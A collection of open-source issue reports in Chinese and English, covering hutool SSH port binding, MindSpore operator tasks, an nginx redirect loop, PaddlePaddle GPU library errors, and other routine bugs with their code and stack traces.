JschUtil 中需要 重载 bindPort方法,"JDK版本： openjdk_8_201 hutool版本：5.7.5 此示例代码可以实现内网端口映射到本机的8080端口，但是只能用127.0.0.1 和localhost访问，问题点在于，如果想让局域网内的其它用户访问该服务，则无法实现 修改建议 <ol start=""3""> 使用方法 此时可以让所有局域网内用户进行访问   <code>: //新建会话，此会话用于ssh连接到跳板机（堡垒机），此处为10.1.1.1:22 Session session = JschUtil.getSession(""10.1.1.1"", 22, ""test"", ""123456""); // 将堡垒机保护的内网8080端口映射到localhost，我们就可以通过访问http://localhost:8080/访问内网服务了 JschUtil.bindPort(session, ""172.20.12.123"", 8080, 8080); /** * 绑定端口到本地。 一个会话可绑定多个端口 * * @param session 需要绑定端口的SSH会话 * @param address 本地ip地址 * @param remoteHost 远程主机 * @param remotePort 远程端口 * @param localPort 本地端口 * @return 成功与否 * @throws JschRuntimeException 端口绑定失败异常 */ public static boolean bindPort(Session session, String remoteHost, int remotePort,String localHost, int localPort) throws JschRuntimeException { if (session != null &amp;&amp; session.isConnected()) { try { session.setPortForwardingL(localHost,localPort, remoteHost, remotePort); } catch (JSchException e) { throw new JschRuntimeException(e, ""From [{}] mapping to [{}] error！"", remoteHost, localPort); } return true; } return false; } JschUtil.bindPort(session,host, Convert.toInt(port),""0.0.0.0"", Convert.toInt(port));"
【开源之夏】【计算-CPU开发】ExtractVolumePatches,"提取立体中的一块数据，是extract_image_patches的3D格式扩展。 Python层接口 接口目录：mindspore/ops/operations/array_ops.py 标杆接口参考 Tensorflow接口： https://www.tensorflow.org/versions/r2.6/api_docs/python/tf/raw_ops/ExtractVolumePatches?hl=zh-cn Input float16, float32, float64, int8, int16, int32, int64, uint8, uint16, uint32, uint64 Output float16, float32, float64, int8, int16, int32, int64, uint8, uint16, uint32, uint64 kernel_size List、Tuple、Int 属性 strides List、Tuple、Int 属性 padding str 属性 3. 异常处理 4. 算子反向 库上已实现。 5. PR !36291:[Summer][Operator] ExtractVolumePatches supports device cpu   <code>: class ExtractVolumePatches(Primitive):"
在linux上面启动nginx循环重定向,"报错日志 2022/02/11 08:48:35 [error] 24#24: *3 rewrite or internal redirection cycle while internally redirecting to ""/index.html"", client: 192.168.200.1, server: localhost, request: ""GET / HTTP/1.1"", host: ""192.168.200.134"" 192.168.200.1 - - [11/Feb/2022:08:48:35 +0000] ""GET / HTTP/1.1"" 500 579 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36"" nginx配置信息为 worker_processes 1; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; }# requirepass 123456 静态文件路径 [图片上传中…(image-Ut5qK6h2pArlecUJkhIz)]   <code>: server { listen 80; server_name localhost; location / { root /home/ruoyi/projects/ruoyi-ui; try_files $uri $uri/ /index.html; index index.html index.htm; } location /prod-api/{ proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header REMOTE-HOST $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://localhost:8080/; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } }"
ImgUtil.slice方法有bug,"比如一张图片，像素是 40 * 30，将其分割成5张，每张分别率是8 * 30，调用slice方法 ，未完成切割；sliceByRowsAndCols方法不允许切割的行或者列有一个为0，这是不合理的。   <code>: ImgUtil.slice(scaleImageFile, slicePath, 8, 30)"
代码生成controller时，如果设置了moduleName，生成的文件中不生效,"当前使用版本 3.0-RC1 而模板中是有判断和设置的   <code>: new PackageConfig().setModuleName(""jddj""); @Controller @RequestMapping(""/wxmessagelog"") public class WxmessagelogController { } /** * &lt;p&gt; * ${table.comment!} 前端控制器 * &lt;/p&gt; * * @author ${author} * @since ${date} */ &lt;#if restControllerStyle&gt; @RestController &lt;#else&gt; @Controller &lt;/#if&gt; @RequestMapping(""&lt;#if package.ModuleName??&gt;/${package.ModuleName}&lt;/#if&gt;/&lt;#if controllerMappingHyphenStyle??&gt;${controllerMappingHyphen}&lt;#else&gt;${table.entityPath}&lt;/#if&gt;"") &lt;#if kotlin&gt; class ${table.controllerName}&lt;#if superControllerClass??&gt; : ${superControllerClass}()&lt;/#if&gt; &lt;#else&gt; &lt;#if superControllerClass??&gt; public class ${table.controllerName} extends ${superControllerClass} { &lt;#else&gt; public class ${table.controllerName} { &lt;/#if&gt;"
UIForm的显示位置设置,SunnyUI 3.1 SunnyUI 引用来源 Nuget 操作系统 Win7 .Net运行环境版本 .Net Framework 4.6.2 UIForm加载时（Load事件）设置this.Location后没有成功，this.Location依然还是X=0，Y=0 问题贴图 问题代码 电脑有两个显示器，窗体在副显示器上打开   <code>: private void ShowInScreen2() { if (Screen.AllScreens.Length &gt; 1) { foreach (Screen sc in Screen.AllScreens) { if (!sc.Primary &amp;&amp; sc.WorkingArea.Width == 1920) { this.Location = sc.WorkingArea.Location; return; } } } }
GPU运行paddle找不到libcublas.so文件求助,"用CPU运行任务正常，GPU运行报错libcublas.so文件找不到： 查看了/usr/lib64 /usr/local/lib 均没有找libcublas.so文件，请问应该怎么设置DYLD_LIBRARY_PATH 路径的地址呢？ 我是pip install paddlepaddle-gpu==0.14.0 这么安装的   <code>: I0717 17:51:02.934375 8384 Util.cpp:166] commandline: --use_gpu=True --trainer_count=2 F0717 17:51:03.277410 8384 DynamicLoader.cpp:106] Check failed: nullptr != *dso_handle Failed to find dynamic library: libcublas.so (libcublas.so: cannot open shared object file: No such file or directory) Please specify its path correctly using following ways: Method. set environment variable LD_LIBRARY_PATH on Linux or DYLD_LIBRARY_PATH on Mac OS. For instance, issue command: export LD_LIBRARY_PATH=... Note: After Mac OS 10.11, using the DYLD_LIBRARY_PATH is impossible unless System Integrity Protection (SIP) is disabled. *** Check failure stack trace: *** @ 0x7f2b0364368d google::LogMessage::Fail() @ 0x7f2b0364713c google::LogMessage::SendToLog() @ 0x7f2b036431b3 google::LogMessage::Flush() @ 0x7f2b0364864e google::LogMessageFatal::~LogMessageFatal() @ 0x7f2b03796f88 GetCublasDsoHandle() @ 0x38c040cbe0 (unknown) @ 0x7f2b035f3b76 hl_cublas_init() @ 0x7f2b035fe0b0 hl_create_global_resources() @ 0x7f2b035fe8f9 hl_specify_devices_start() @ 0x7f2b035fed1d hl_start() @ 0x7f2b0358745a paddle::initMain() @ 0x7f2b0362b091 initPaddle() @ 0x7f2b0319f509 _wrap_initPaddle @ 0x7f2b3a3803d3 PyEval_EvalFrameEx @ 0x7f2b3a382160 PyEval_EvalCodeEx @ 0x7f2b3a3804d1 PyEval_EvalFrameEx @ 0x7f2b3a382160 PyEval_EvalCodeEx @ 0x7f2b3a30e1b1 function_call @ 0x7f2b3a2e6123 PyObject_Call @ 0x7f2b3a37ee17 PyEval_EvalFrameEx @ 0x7f2b3a382160 PyEval_EvalCodeEx @ 0x7f2b3a3804d1 PyEval_EvalFrameEx @ 0x7f2b3a382160 PyEval_EvalCodeEx @ 0x7f2b3a3804d1 PyEval_EvalFrameEx @ 0x7f2b3a382160 PyEval_EvalCodeEx @ 0x7f2b3a382272 PyEval_EvalCode @ 0x7f2b3a39c65c run_mod @ 0x7f2b3a39c730 PyRun_FileExFlags @ 0x7f2b3a39dc3c PyRun_SimpleFileExFlags @ 0x7f2b3a3af4fc Py_Main @ 0x38bfc21b45 (unknown) *** Aborted at 1531821063 (unix time) try ""date -d @1531821063"" if you are using GNU date *** PC: @ 0x0 (unknown) *** SIGABRT (@0x1f4000020c0) received by PID 8384 (TID 0x7f2b3a287740) from PID 8384; stack trace: *** @ 0x38c040f130 (unknown) @ 0x38bfc359d9 (unknown) @ 0x38bfc370e8 (unknown) @ 0x7f2b0364dbcb google::FindSymbol() @ 0x7f2b0364e58a google::GetSymbolFromObjectFile() @ 0x7f2b0364ec52 google::SymbolizeAndDemangle() @ 0x7f2b0364c458 google::DumpStackTrace() @ 0x7f2b0364c516 google::DumpStackTraceAndExit() @ 0x7f2b0364368d google::LogMessage::Fail() @ 0x7f2b0364713c google::LogMessage::SendToLog() @ 0x7f2b036431b3 google::LogMessage::Flush() @ 0x7f2b0364864e google::LogMessageFatal::~LogMessageFatal() @ 0x7f2b03796f88 GetCublasDsoHandle() @ 0x38c040cbe0 (unknown) @ 0x7f2b035f3b76 hl_cublas_init() @ 0x7f2b035fe0b0 hl_create_global_resources() @ 0x7f2b035fe8f9 hl_specify_devices_start() @ 0x7f2b035fed1d hl_start() @ 0x7f2b0358745a paddle::initMain() @ 0x7f2b0362b091 initPaddle() @ 0x7f2b0319f509 _wrap_initPaddle @ 0x7f2b3a3803d3 PyEval_EvalFrameEx @ 0x7f2b3a382160 PyEval_EvalCodeEx @ 0x7f2b3a3804d1 PyEval_EvalFrameEx @ 0x7f2b3a382160 PyEval_EvalCodeEx @ 0x7f2b3a30e1b1 function_call @ 0x7f2b3a2e6123 PyObject_Call @ 0x7f2b3a37ee17 PyEval_EvalFrameEx @ 0x7f2b3a382160 PyEval_EvalCodeEx @ 0x7f2b3a3804d1 PyEval_EvalFrameEx @ 0x7f2b3a382160 PyEval_EvalCodeEx @ 0x7f2b3a3804d1 PyEval_EvalFrameEx Aborted"
fluid.layers.data里面指定的shape与实际输出不符合预期,"举例来说，输入层指定的shape是[5,1]： 实际运行时Print出来变成了[1,5]（batch_size为2)。输出如下： shape: [2,1,5,] dtype: l data: 3737,19450,100000,100000,100000,6855,3805,100000,100000,100000, 请问该怎么理解layers.data里面的shape？   <code>: fluid.layers.data(name="""", shape=[5, 1], dtype=""int64"")"
图片加载问题,"在后台开启了图片延时加载，访问帖子时，如果图片在窗口上，就显示图片。 这里遇到一个问题，代码里面 里面的 height是哪里来的？后台只设置了 width 。有时会这个 height 和实际不符，导致图片缩放变形。 另外，如果不在窗口上，下滑后才加载出来的话，这个 height 就没有。   <code>: width=""790"" height=""790"""
BUG-代码预览报错,"JDK版本： openjdk_8_201 erupt版本： 1.6.7 新建类型 - Reached through: #include ""erupt-code.java"" [in template ""generator/erupt-code-skeleton.ftl"" at line 36, column 41]   <code>: at freemarker.core.InvalidReferenceException.getInstance(InvalidReferenceException.java:134) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.core.UnexpectedTypeException.newDescriptionBuilder(UnexpectedTypeException.java:85) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.core.UnexpectedTypeException.&lt;init&gt;(UnexpectedTypeException.java:48) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.core.BuiltInsForMultipleTypes$stringBI._eval(BuiltInsForMultipleTypes.java:780) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.core.Expression.eval(Expression.java:101) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.core.MethodCall._eval(MethodCall.java:55) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.core.Expression.eval(Expression.java:101) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.core.DollarVariable.calculateInterpolatedStringOrMarkup(DollarVariable.java:100) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.core.DollarVariable.accept(DollarVariable.java:63) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.core.Environment.visit(Environment.java:383) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.core.IteratorBlock$IterationContext.executedNestedContentForCollOrSeqListing(IteratorBlock.java:321) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.core.IteratorBlock$IterationContext.executeNestedContent(IteratorBlock.java:271) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.core.IteratorBlock$IterationContext.accept(IteratorBlock.java:244) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.core.Environment.visitIteratorBlock(Environment.java:657) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.core.IteratorBlock.acceptWithResult(IteratorBlock.java:108) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.core.IteratorBlock.accept(IteratorBlock.java:94) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.core.Environment.visit(Environment.java:347) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.core.Environment.visit(Environment.java:353) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.core.Environment.include(Environment.java:2955) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.core.Include.accept(Include.java:171) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.core.Environment.visit(Environment.java:347) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.core.Environment.visit(Environment.java:353) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.core.Environment.process(Environment.java:326) ~[freemarker-2.3.31.jar:2.3.31] at freemarker.template.Template.process(Template.java:383) ~[freemarker-2.3.31.jar:2.3.31] at xyz.erupt.tpl.engine.FreemarkerEngine.render(FreemarkerEngine.java:33) ~[erupt-tpl-1.6.7.jar:na] at xyz.erupt.tpl.engine.FreemarkerEngine.render(FreemarkerEngine.java:15) ~[erupt-tpl-1.6.7.jar:na] at xyz.erupt.tpl.service.EruptTplService.tplRender(EruptTplService.java:110) ~[erupt-tpl-1.6.7.jar:na] at xyz.erupt.tpl.service.EruptTplService.tplRender(EruptTplService.java:99) ~[erupt-tpl-1.6.7.jar:na] at xyz.erupt.tpl.service.EruptTplService.tplRender(EruptTplService.java:89) ~[erupt-tpl-1.6.7.jar:na] at xyz.erupt.tpl.controller.EruptTplController.getOperationTpl(EruptTplController.java:98) ~[erupt-tpl-1.6.7.jar:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_171] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_171] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_171] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_171] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:197) ~[spring-web-5.3.4.jar:5.3.4] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:141) ~[spring-web-5.3.4.jar:5.3.4] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) ~[spring-webmvc-5.3.4.jar:5.3.4] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:894) ~[spring-webmvc-5.3.4.jar:5.3.4] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808) ~[spring-webmvc-5.3.4.jar:5.3.4] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.3.4.jar:5.3.4] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1060) ~[spring-webmvc-5.3.4.jar:5.3.4] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:962) ~[spring-webmvc-5.3.4.jar:5.3.4] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.3.4.jar:5.3.4] at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) ~[spring-webmvc-5.3.4.jar:5.3.4] at javax.servlet.http.HttpServlet.service(HttpServlet.java:626) ~[tomcat-embed-core-9.0.43.jar:4.0.FR] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ~[spring-webmvc-5.3.4.jar:5.3.4] at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) ~[tomcat-embed-core-9.0.43.jar:4.0.FR] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227) ~[tomcat-embed-core-9.0.43.jar:9.0.43] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.43.jar:9.0.43] at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) ~[tomcat-embed-websocket-9.0.43.jar:9.0.43] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.43.jar:9.0.43] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.43.jar:9.0.43] at xyz.erupt.security.interceptor.HttpServletRequestFilter.doFilter(HttpServletRequestFilter.java:42) ~[erupt-security-1.6.7.jar:na] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.43.jar:9.0.43] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.43.jar:9.0.43] at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-5.3.4.jar:5.3.4] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.4.jar:5.3.4] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.43.jar:9.0.43] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.43.jar:9.0.43] at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-5.3.4.jar:5.3.4] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.4.jar:5.3.4] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.43.jar:9.0.43] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.43.jar:9.0.43] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.3.4.jar:5.3.4] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.4.jar:5.3.4] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.43.jar:9.0.43] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.43.jar:9.0.43] at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) ~[tomcat-embed-core-9.0.43.jar:9.0.43] at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) [tomcat-embed-core-9.0.43.jar:9.0.43] at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) [tomcat-embed-core-9.0.43.jar:9.0.43] at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) [tomcat-embed-core-9.0.43.jar:9.0.43] at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.43.jar:9.0.43] at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) [tomcat-embed-core-9.0.43.jar:9.0.43] at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:346) [tomcat-embed-core-9.0.43.jar:9.0.43] at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) [tomcat-embed-core-9.0.43.jar:9.0.43] at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.43.jar:9.0.43] at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:887) [tomcat-embed-core-9.0.43.jar:9.0.43] at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1684) [tomcat-embed-core-9.0.43.jar:9.0.43] at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.43.jar:9.0.43] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_171] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_171] at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.43.jar:9.0.43] at java.lang.Thread.run(Thread.java:748) [na:1.8.0_171]"
新需求：文件下载返回二进制流,"示例： public interface MyClient{ }   <code>: @Request( url=""http://localhost:8080/download/${fileMd5}"" ) byte[] downloadFile(@DataVariable(""fileMd5"") String fileMd5)"
A question about config_parser_utils and config_parser,"In directory python/paddle/trainer_config_helpers, we have two modules: config_parser.py, and config_parser_util.py Both define the following three functions: with no more than slight difference. Does anyone know why we need these seems duplicated function definitions?   <code>: def parse_trainer_config(trainer_conf, config_arg_str) def parse_network_config(network_conf, config_arg_str='') def parse_optimizer_config(optimizer_conf, config_arg_str=''):"
控制台程序无法使用EventBus,"Furion 版本号 4.0.5 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp [√] Console 发生了什么？ 控制台中使用IEventPublisher发布事件，无法进入订阅端消费 net6.0控制台程序 等待20秒后执行结果 可以正常走订阅消费   <code>: using Furion; using Furion.DependencyInjection; using Furion.EventBus; using Microsoft.Extensions.DependencyInjection; Console.WriteLine(""Hello, World!""); var service = Inject.Create(); service.AddEventBus(); service.Build(); var publisher = App.GetRequiredService&lt;IEventPublisher&gt;(); await publisher.PublishAsync(""ToDo:Create""); Console.WriteLine(""End""); Console.ReadLine(); public class EventSub : IEventSubscriber, ISingleton { [EventSubscribe(""ToDo:Create"")] public async Task CreateToDo(EventHandlerExecutingContext context) { Console.WriteLine(""Event Sub""); await Task.CompletedTask; } }"
在支付宝小程序中全息检测报错,"在支付宝小程序中报错如下： 版本：""version"": ""1.8.3"", 定位错误在 第14行 这里的 应该是 才对吧？   <code>: 存在错误使用 = 作为条件判断 In conditional statements, it is very easy to mistype a comparison operator (such as ==) as an assignment operator (such as =). timeFormat.js while (times &gt;&gt;= 1) { fillString += fillString if (times === 1) { fillString += fillString } } times &gt;&gt;= 1 times &gt;== 1"
paddle.init使用gpu(use_gpu=true)报错？,"我在官网下载的, 的whl（），然后使用 进行安装，安装完之后运行下面代码 报以下错误 我本机环境为,+ 顺便问一下和分别代表的什么意思？   <code>: cudn8.0 cudnn5 cuda8.0_cudnn5_avx_mkl pip install paddlepaddle_gpu-0.11.0-cp27-cp27mu-linux_x86_64.whl import paddle.v2 as paddle paddle.init(use_gpu=True, trainer_count=1) I0426 19:12:06.650014 28996 Util.cpp:166] commandline: --use_gpu=True --trainer_count=1 F0426 19:12:07.087769 28996 hl_cuda_cudnn.cc:171] Check failed: (cudnn_cuh_major &lt; 4 &amp;&amp; cudnn_dso_major &lt; 4) || (cudnn_cuh_major == cudnn_dso_major) [cudnn init] libcudnn v7 with header v5 unmatched! PaddlePaddle Requirement: (header v[2-3] with libcudnn v[2-3]) Or (header v4 with libcudnn v4) Or (header v5 with libcudnn v5) Or(header v6 with libcudnn v6). ubuntu16.04 cuda8.0 cudnn5.1 cat /usr/local/cuda/include/cudnn.h | grep CUDNN_MAJOR -A 2 #define CUDNN_MAJOR 5 #define CUDNN_MINOR 1 #define CUDNN_PATCHLEVEL 10 -- #define CUDNN_VERSION (CUDNN_MAJOR * 1000 + CUDNN_MINOR * 100 + CUDNN_PATCHLEVEL) #include ""driver_types.h"" cp27-cp27mu cp27-cp27m"
【众智】【计算-AICPU开发】Cast,"Cast 1.1 功能介绍 1.2 接口描述 Python 层接口 接口目录：mindspore/ops/operations/array_ops.py class Cast(Primitive): 已实现   <code>: REG_OP(Cast) .INPUT(x, TensorType({DT_BOOL, DT_FLOAT16, DT_FLOAT, DT_INT8, DT_INT32, DT_UINT32, DT_UINT8, DT_INT64, DT_UINT64, DT_INT16, DT_UINT16, DT_DOUBLE, DT_COMPLEX64, DT_COMPLEX128, DT_QINT8, DT_QUINT8, DT_QINT16, DT_QUINT16, DT_QINT32, DT_BF16})) .OUTPUT(y, TensorType({DT_BOOL, DT_FLOAT16, DT_FLOAT, DT_INT8, DT_INT32, DT_UINT32, DT_UINT8, DT_INT64, DT_UINT64, DT_INT16, DT_UINT16, DT_DOUBLE, DT_COMPLEX64, DT_COMPLEX128, DT_QINT8, DT_QUINT8, DT_QINT16, DT_QUINT16, DT_QINT32, DT_BF16})) .REQUIRED_ATTR(dst_type, Int) .OP_END_FACTORY_REG(Cast)"
"[CT][MS] sens param is False, ones_like_leaf not support",": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version :   <code>: def grad_mindspore_impl(self): input = Tensor(self.input_np) #output_grad = self.forward_mindspore_impl() net = DType() grad_net = GradOfFirstInput(net, sens_param=False) grad_net.set_train() input_grad = grad_net(input) return input_grad.asnumpy() _______________________________________________________________________________ test_dtype_input_1x12x1x1_dtype_uint8 _______________________________________________________________________________ @Author('zwx682644') @Level2 def test_dtype_input_1x12x1x1_dtype_uint8(): input_shape = (1,12,1,1) dtype = np.uint8 fact = DTypeFactory(input_shape, dtype = dtype) fact.forward_cmp() &gt; fact.grad_cmp() test_dtype.py:171: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/dtype_ops.py:49: in grad_cmp input_grad_mindspore = self.grad_mindspore_impl() ../share/ops/dtype_ops.py:41: in grad_mindspore_impl input_grad = grad_net(input) /root/miniconda3/envs/zb/lib/python3.7/site-packages/mindspore/nn/cell.py:240: in __call__ out = self.compile_and_run(*inputs) /root/miniconda3/envs/zb/lib/python3.7/site-packages/mindspore/nn/cell.py:454: in compile_and_run _executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._Executor object at 0x7fd52bf376d0&gt;, obj = GradOfFirstInput&lt; (network): WrapOp&lt;&gt; &gt;, phase = '0train.1598990550990146304', do_convert = True auto_parallel_mode = False, args = (Tensor(shape=[1, 12, 1, 1], dtype=UInt8, [[[[ 0]], [[255]], [[ 0]], ... [[ 0]], [[ 0]], [[ 1]]]]),) def compile(self, obj, *args, phase='predict', do_convert=True, auto_parallel_mode=False): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. auto_parallel_mode: When set to True, use auto parallel mode to compile graph. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.check_names() args_names, args_list = _generate_pip_args(obj, *args) dic = dict(zip(args_names, args_list)) key = generate_key(phase, dic) self.phase_prefix = str(key[1]) if 'export' in phase: phase = phase + '.' + self.phase_prefix + '.' + str(obj.create_time) else: phase = self.phase_prefix + phase + '.' + str(obj.create_time) enable_debug_runtime = context.get_context(""enable_debug_runtime"") enable_ge = context.get_context(""enable_ge"") use_vm = not enable_ge or (enable_debug_runtime and context.get_context(""mode"") == context.PYNATIVE_MODE) self._set_dataset_mode(args_list) if phase in self.compile_cache.keys(): logger.debug(""%r graph has existed."", phase) return phase, False is_sink_mode = args and isinstance(args[0], Tensor) and args[0].virtual_flag if auto_parallel_mode and _need_to_full() and not is_sink_mode and obj.auto_parallel_compile_and_run(): args_full = _to_full_tensor(args, _get_device_num(), _get_global_rank()) _, args_list = _generate_pip_args(obj, *args_full) &gt; result = self._executor.compile(obj, args_list, phase, use_vm) E RuntimeError: mindspore/ccsrc/frontend/operator/composite/multitype_funcgraph.cc:138 GenerateFromTypes] The 'ones_like_leaf' operation does not support the type [kMetaTypeTypeType] E There are 3 prototypes for overload function `ones_like_leaf`, corresponding location info: E 1. [SparseTensor] E In file /root/miniconda3/envs/zb/lib/python3.7/site-packages/mindspore/ops/composite/multitype_ops/ones_like_impl.py(46) E def _ones_like_sparse_tensor(x): E E 2. [Number] E In file /root/miniconda3/envs/zb/lib/python3.7/site-packages/mindspore/ops/composite/multitype_ops/ones_like_impl.py(33) E def _ones_like_scalar(x): E E 3. [Tensor] E In file /root/miniconda3/envs/zb/lib/python3.7/site-packages/mindspore/ops/composite/multitype_ops/ones_like_impl.py(40) E def _ones_like_tensor(x): E E E The function call stack: E # 0 In file /home/zhengbin/gpu/MindTester/share/grad.py(18) E if self.wrt_params: /root/miniconda3/envs/zb/lib/python3.7/site-packages/mindspore/common/api.py:411: RuntimeError"
